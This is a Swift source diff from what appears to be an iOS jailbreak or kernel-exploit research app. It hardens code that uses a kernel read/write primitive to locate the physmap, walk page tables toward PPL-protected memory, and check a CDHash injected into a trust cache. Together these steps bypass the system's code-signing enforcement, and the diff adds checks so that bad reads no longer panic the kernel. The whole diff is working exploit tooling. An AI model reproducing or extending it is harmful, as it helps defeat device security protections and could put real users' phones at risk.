@@ -290,8 +290,21 @@ private func verifyPhysmapCandidates(
         }
         let kernPhys = kernBase &- gVirtBaseCandidate &+ gPhysBase
         let physmapVA = gVirtBaseCandidate &+ (kernPhys &- gPhysBase)
-        let verifyVal = ds_kread64_safe(physmapVA)
-        let matches = verifyVal == kernMagic && kernMagic != 0
+
+        // Exp 74 panic: KRW read at garbage physmapVA (e.g. 0xfffffffbffffffff) → copy_validate_kernel_addr
+        let matches: Bool
+        let verifyVal: UInt64
+        if isSafePhysmapKRWAddress(physmapVA) {
+            verifyVal = safeKread64Physmap(physmapVA)
+            matches = verifyVal == kernMagic && kernMagic != 0
+        } else if physmapVA == kernBase {
+            // Algebra gives kernBase — verify via __TEXT only (no read at unsafe VA)
+            verifyVal = ds_kread64_safe(kernBase)
+            matches = verifyVal == kernMagic && kernMagic != 0
+        } else {
+            continue
+        }
+
         tested += 1
         if tested <= 6 || matches {
             detail += "\(name): gVirt=0x\(String(format: "%llx", gVirtBaseCandidate))\n"
@@ -4171,27 +4184,29 @@ struct AMFIExperimentView: View {
 
             if l1Entry & 0x3 == 0x3 {
                 let l2TablePhys = l1Entry & 0x0000FFFFFFFC0000
-                let l2TableVA = l2TablePhys &- gPhysBase &+ gVirtBase
-                let l2Entry = ds_kread64_safe(l2TableVA + l2Idx * 8)
-                detail += "L2[\(l2Idx)]: 0x\(String(format: "%llx", l2Entry))\n"
+                if let l2TableVA = physmapVA(fromPhysical: l2TablePhys, gVirt: gVirtBase, gPhys: gPhysBase) {
+                    let l2Entry = safeKread64Physmap(l2TableVA + l2Idx * 8)
+                    detail += "L2[\(l2Idx)]: 0x\(String(format: "%llx", l2Entry))\n"
 
-                if l2Entry & 0x3 == 0x3 {
-                    let l3TablePhys = l2Entry & 0x0000FFFFFFFC0000
-                    let l3TableVA = l3TablePhys &- gPhysBase &+ gVirtBase
-                    let l3Entry = ds_kread64_safe(l3TableVA + l3Idx * 8)
-                    if l3Entry & 0x3 == 0x3 {
-                        let pplPagePhys = l3Entry & 0x0000FFFFFFFC0000
-                        let pplPhysmapVA = pplPagePhys &- gPhysBase &+ gVirtBase &+ pageOff
-                        detail += "\n✅ PAGE TABLE WALK COMPLETE!\n"
-                        detail += "PPL physmap VA: 0x\(String(format: "%llx", pplPhysmapVA))\n"
-                        let physmapRead = ds_kread64_safe(pplPhysmapVA)
-                        detail += "Physmap read: 0x\(String(format: "%llx", physmapRead))\n\n"
+                    if l2Entry & 0x3 == 0x3,
+                       let l3TableVA = physmapVA(fromPhysical: l2Entry & 0x0000FFFFFFFC0000, gVirt: gVirtBase, gPhys: gPhysBase) {
+                        let l3Entry = safeKread64Physmap(l3TableVA + l3Idx * 8)
+                        if l3Entry & 0x3 == 0x3,
+                           let pplPhysmapVA = physmapVA(fromPhysical: l3Entry & 0x0000FFFFFFFC0000, gVirt: gVirtBase, gPhys: gPhysBase, offset: pageOff) {
+                            detail += "\n✅ PAGE TABLE WALK COMPLETE!\n"
+                            detail += "PPL physmap VA: 0x\(String(format: "%llx", pplPhysmapVA))\n"
+                            let physmapRead = safeKread64Physmap(pplPhysmapVA)
+                            detail += "Physmap read: 0x\(String(format: "%llx", physmapRead))\n\n"
+                        } else {
+                            detail += "❌ L3 invalid — fallback direct scan\n\n"
+                            usePageTableWalk = false
+                        }
                     } else {
-                        detail += "❌ L3 invalid — fallback direct scan\n\n"
+                        detail += "❌ L2/L3 invalid — fallback direct scan\n\n"
                         usePageTableWalk = false
                     }
                 } else {
-                    detail += "❌ L2 invalid — fallback direct scan\n\n"
+                    detail += "❌ L2 physmap VA invalid — fallback direct scan\n\n"
                     usePageTableWalk = false
                 }
             } else {
@@ -4471,7 +4486,9 @@ struct AMFIExperimentView: View {
         }
         
         let verifyH = safeKread64Physmap(injectPhysmapVA)
-        let newCount = ds_kread32_safe(countPhysmapVA)
+        let newCount = isSafePhysmapKRWAddress(tcPhysmapVA + 4)
+            ? ds_kread32_safe(tcPhysmapVA + 4)
+            : ds_kread32_safe(tcStructAddr + 4)
         detail += "Verify CDHash: 0x\(String(format: "%llx", verifyH))\n"
         detail += "New count: \(newCount) (was \(tcEntryCount))\n\n"
         
